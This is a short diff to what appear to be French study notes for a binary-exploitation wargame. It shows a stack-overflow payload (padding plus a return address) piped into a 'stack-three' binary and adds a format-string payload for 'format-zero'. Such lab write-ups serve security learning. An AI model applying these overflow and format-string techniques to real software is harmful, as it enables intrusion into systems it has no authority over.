@@ -115,4 +115,6 @@ il faut désactiver l'encodage utf8 en octet pur donc plus de printf mais stdout
 
 python3 -c 'print("A"*63 + "\x9d\x06\x40")' | ./stack-three
 
+**format-zero**
 
+python3 -c 'print("%33x")' |./format-zero
